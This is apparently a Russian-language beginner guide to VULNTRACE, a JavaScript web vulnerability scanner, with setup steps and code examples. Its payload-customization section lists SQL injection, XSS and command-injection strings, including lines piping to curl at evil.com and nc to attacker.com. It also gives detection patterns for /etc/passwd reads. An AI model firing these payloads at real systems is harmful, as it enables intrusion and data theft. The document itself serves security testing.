# 🎓 VULNTRACE - Руководство для новичков (Middle Level)

## 📋 Введение

**Добро пожаловать в VULNTRACE!** Это руководство поможет вам освоить Network-Level Security Observation Scanner с нуля до уверенного использования.

### 🎯 Что такое VULNTRACE?

VULNTRACE - это профессиональный инструмент для:
- 🔍 **Network-level security observation** - наблюдение за безопасностью на уровне сети
- 🔬 **Sink-level validation** - подтверждение уязвимостей через браузер
- 📊 **Evidence-based detection** - детекция на основе реальных доказательств
- 🔁 **Reproducible traces** - воспроизводимые трассы выполнения

---

## 🚀 Быстрый старт

### 📦 Установка и запуск

```bash
# 1. Переход в папку проекта
cd /Users/razdor/Documents/GitHub/VULNTRACE

# 2. Установка зависимостей
npm install

# 3. Первый запуск (простой аудит)
npm start
```

### 🔧 Первая конфигурация

Создайте файл `my-first-audit.js`:

```javascript
#!/usr/bin/env node

const RealAuditEngine = require('./real-audit-engine');

async function myFirstAudit() {
    console.log('🔥 Мой первый аудит с VULNTRACE');
    
    // Создаем движок с базовыми настройками
    const engine = new RealAuditEngine('example.com', {
        timeout: 30000,        // 30 секунд
        maxRetries: 2,          // Максимум 2 попытки
        userAgent: 'My First VULNTRACE Test'
    });
    
    try {
        // Выполняем аудит
        const report = await engine.performRealAudit();
        
        // Показываем основные результаты
        console.log('✅ Аудит завершен!');
        console.log(`📊 Всего трасс: ${report.metadata.totalTraces}`);
        console.log(`🔍 Evidence найдено: ${report.evidence.tracesWithEvidence}`);
        
    } catch (error) {
        console.error('❌ Ошибка:', error.message);
    }
}

myFirstAudit();
```

Запустите: `node my-first-audit.js`

---

## 🔍 Основные концепции

### 📈 Network-Level vs Sink-Level

**Network-Level Observation**:
- Что делает: Отправляет HTTP запросы и анализирует ответы
- Когда использовать: Для быстрого сканирования многих целей
- Плюсы: Быстро, просто, мало ресурсов
- Ограничения: Только surface-level анализ

**Sink-Level Validation**:
- Что делает: Запускает реальный браузер и проверяет выполнение
- Когда использовать: Для глубокого анализа конкретных целей
- Плюсы: Точно подтверждает уязвимости
- Минусы: Медленнее, больше ресурсов

### 🎯 Evidence-Based Detection

VULNTRACE не "угадывает" уязвимости - он ищет **доказательства**:

**Типы evidence**:
- **SQL ошибки**: `SQL syntax.*MySQL`, `ORA-[0-9]{5}`
- **XSS reflection**: `<script>.*</script>` в response body
- **Command injection**: `sh: command not found`, `bash:`
- **Directory traversal**: `root:x:0:0`, `etc/passwd`
- **File inclusion**: `Warning: include()`, `Failed opening`

**Classification**:
- `VULNERABLE` - найден concrete evidence
- `NO_EVIDENCE` - evidence не найден (НЕ "безопасно"!)
- `INSUFFICIENT_DATA` - недостаточно данных

---

## 🛠️ Практические примеры

### 📊 Пример 1: Базовый аудит

```javascript
const RealAuditEngine = require('./real-audit-engine');

async function basicAudit() {
    const engine = new RealAuditEngine('test-target.com', {
        timeout: 60000,
        maxRetries: 3
    });
    
    const report = await engine.performRealAudit();
    
    // Анализируем результаты
    console.log('=== РЕЗУЛЬТАТЫ АУДИТА ===');
    console.log(`Цель: ${report.metadata.target}`);
    console.log(`Длительность: ${report.metadata.duration}ms`);
    console.log(`Всего трасс: ${report.metadata.totalTraces}`);
    
    // Проверяем evidence
    const evidenceTypes = Object.keys(report.evidence.evidenceTypes);
    if (evidenceTypes.length > 0) {
        console.log('НАЙДЕНЫ УЯЗВИМОСТИ:');
        evidenceTypes.forEach(type => {
            console.log(`  - ${type}: ${report.evidence.evidenceTypes[type]}`);
        });
    } else {
        console.log('Уязвимости не найдены (NO_EVIDENCE)');
    }
}

basicAudit();
```

### 🔬 Пример 2: Sink-level validation

```javascript
const SinkLevelValidator = require('./sink-level-validator');

async function sinkValidation() {
    const validator = new SinkLevelValidator('test-target.com', {
        headless: true,      // Без графического интерфейса
        timeout: 30000
    });
    
    try {
        await validator.initialize();
        const report = await validator.performSinkLevelAudit();
        
        console.log('=== SINK-LEVEL VALIDATION ===');
        console.log(`JavaScript execution: ${report.executionEvidence.javascriptExecution}`);
        console.log(`Network requests: ${report.executionEvidence.networkActivity.length}`);
        console.log(`Vulnerabilities found: ${report.summary.vulnerabilitiesFound}`);
        
    } finally {
        await validator.destroy(); // Важно!
    }
}

sinkValidation();
```

### 🎯 Пример 3: Комплексный аудит

```javascript
const VULNTRACEFinalTest = require('./vulntrace-final-test');

async function comprehensiveAudit() {
    const vulntrace = new VULNTRACEFinalTest('target.com');
    
    console.log('🔥 КОМПЛЕКСНЫЙ АУДИТ');
    
    const results = await vulntrace.performFullEmpiricalTest();
    
    // Анализируем все результаты
    console.log('=== КОМПЛЕКСНЫЙ АНАЛИЗ ===');
    console.log(`Network traces: ${results.networkLevel.metadata.totalTraces}`);
    console.log(`Sink tests: ${results.sinkLevel.summary.totalSinkTests}`);
    console.log(`Overall classification: ${results.combined.overallAssessment.classification}`);
    console.log(`Confidence: ${(results.combined.overallAssessment.confidence * 100).toFixed(1)}%`);
}

comprehensiveAudit();
```

---

## 📈 Продвинутые техники

### 🔍 Работа с trace IDs

Каждый запрос имеет уникальный trace ID:

```javascript
// Извлечение конкретного trace
const traceId = 'abc123def456';
const trace = report.rawTraces.find(t => t.traceId === traceId);

if (trace) {
    console.log('Trace найден:');
    console.log(`Payload: ${trace.payload}`);
    console.log(`Status: ${trace.response.status}`);
    console.log(`Evidence: ${JSON.stringify(trace.evidence)}`);
}
```

### 📊 Анализ метрик

```javascript
// Расчет собственных метрик
function calculateCustomMetrics(traces) {
    const totalTraces = traces.length;
    const vulnerableTraces = traces.filter(t => 
        t.classification.vulnerable === true
    ).length;
    
    const detectionRate = (vulnerableTraces / totalTraces) * 100;
    
    console.log(`Detection rate: ${detectionRate.toFixed(2)}%`);
    console.log(`Vulnerable traces: ${vulnerableTraces}/${totalTraces}`);
    
    return {
        detectionRate,
        vulnerableTraces,
        totalTraces
    };
}
```

### 🔧 Кастомизация payloads

```javascript
// Создание собственных payload'ов
const customPayloads = [
    // SQL Injection
    "' OR 1=1--",
    "'; EXEC xp_cmdshell('dir')--",
    
    // XSS
    "<svg onload=alert('custom')>",
    "javascript:alert('custom-xss')",
    
    // Command Injection
    "; curl http://evil.com/steal",
    "| nc attacker.com 4444"
];

// Использование в Real Audit Engine
const engine = new RealAuditEngine('target.com', {
    customPayloads: {
        sqlInjection: customPayloads.slice(0, 3),
        xss: customPayloads.slice(3, 6)
    }
});
```

---

## 🚨 Устранение проблем

### 🔧 Частые ошибки новичков

**1. "ETIMEDOUT" ошибки**:
```javascript
// Решение: увеличить timeout
const engine = new RealAuditEngine('target.com', {
    timeout: 120000  // 2 минуты вместо 30 секунд
});
```

**2. "Too many arguments" в sink-level**:
```javascript
// Решение: обернуть аргументы в объект
page.evaluate((input) => {
    // Ваш код здесь
}, { arg1: value1, arg2: value2 });
```

**3. Нет отчетов**:
```javascript
// Решение: проверить права папок
const fs = require('fs');
const path = require('path');

const reportsDir = path.join(process.cwd(), 'reports');
if (!fs.existsSync(reportsDir)) {
    fs.mkdirSync(reportsDir, { recursive: true });
}
```

### 📛 Отладка трасс

```javascript
// Добавление логирования
const engine = new RealAuditEngine('target.com', {
    debug: true,  // Включить debug режим
    logLevel: 'verbose'  // Детальное логирование
});

// Или анализ сохраненных трасс
const fs = require('fs');
const tracesFile = 'traces/traces_sessionid.json';
const traces = JSON.parse(fs.readFileSync(tracesFile, 'utf8'));

traces.forEach(trace => {
    if (trace.evidence && Object.keys(trace.evidence).length > 0) {
        console.log(`🚨 Evidence в trace ${trace.traceId}:`);
        console.log(JSON.stringify(trace.evidence, null, 2));
    }
});
```

---

## 🎯 Следующие шаги

### 📚 Что изучить дальше

1. **OWASP Testing Guide** - методология тестирования
2. **HTTP Protocol** - понимание запросов/ответов
3. **Browser Automation** - продвинутые техники Playwright
4. **Security Metrics** - precision/recall/F1 score

### 🛠️ Практические проекты

1. **Массовый сканер** - аудит списка доменов
2. **Scheduled scanning** - регулярные проверки
3. **Integration с CI/CD** - автоматизация в pipeline
4. **Custom reporting** - собственные форматы отчетов

### 🔬 Продвинутые возможности

1. **Backend-aware probing** - тестирование API endpoints
2. **Stateful attack chains** - многошаговые атаки
3. **Custom evidence patterns** - собственные правила детекции
4. **Performance optimization** - ускорение сканирования

---

## 📞 Помощь и поддержка

### 🐛 Если что-то не работает

1. **Проверьте версию Node.js**: `node --version` (нужно >= 16.0.0)
2. **Проверьте права доступа**: к папкам reports/ и traces/
3. **Проверьте сетевое соединение**: брандмауэр, прокси
4. **Изучите логи ошибок**: они очень информативны

### 💬 Сообщество

- **GitHub Issues**: для баг-репортов и фич-реквестов
- **Документация**: всегда актуальна в репозитории
- **Примеры**: в папке examples/ (будет добавлена)

### 📖 Дополнительные ресурсы

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Security Testing Handbook](https://owasp.org/www-project-web-security-testing-guide/)
- [HTTP RFC 2616](https://tools.ietf.org/html/rfc2616/)
- [Playwright Documentation](https://playwright.dev/)

---

## 🎉 Заключение

Вы прошли путь от установки до комплексного аудита! Теперь вы:

- ✅ Понимаете архитектуру VULNTRACE
- ✅ Можете проводить базовые и продвинутые аудиты
- ✅ Умеете анализировать результаты и метрики
- ✅ Знаете как устранять типовые проблемы

**Продолжайте экспериментировать и изучать!** VULNTRACE создан для реальной работы с безопасностью.

---

*Руководство обновлено: 9 мая 2026*  
*Версия: VULNTRACE v1.0*  
*Уровень: Middle*
